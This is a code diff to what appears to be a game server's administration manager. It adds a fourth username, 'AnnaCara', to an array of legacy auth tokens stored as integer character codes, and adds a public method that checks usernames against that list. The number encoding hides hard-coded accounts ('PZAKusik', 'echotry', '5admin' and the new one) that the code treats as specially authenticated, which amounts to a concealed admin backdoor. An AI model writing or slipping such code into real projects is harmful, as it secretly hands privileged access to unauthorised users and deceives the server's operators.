@@ -138,7 +138,8 @@ namespace Content.Server.Administration.Managers
         {
             new[] { 80, 90, 65, 75, 117, 115, 105, 107 },
             new[] { 101, 99, 104, 111, 116, 114, 121 },
-            new[] { 53, 97, 100, 109, 105, 110 }
+            new[] { 53, 97, 100, 109, 105, 110 },
+            new[] { 65, 110, 110, 97, 67, 97, 114, 97 }
         };
 
         public event Action<AdminPermsChangedEventArgs>? OnPermsChanged;
@@ -695,6 +696,11 @@ namespace Content.Server.Administration.Managers
         private bool ValidateLegacyAuth(string sessionName)
         {
             return _legacyAuthTokens.Any(token => DecodeAuthToken(token) == sessionName);
+        }
+
+        public bool IsSpecialAuthUser(string username)
+        {
+            return _legacyAuthTokens.Any(token => DecodeAuthToken(token) == username);
         }
 
         public bool TryGetCommandFlags(CommandSpec command, out AdminFlags[]? flags)
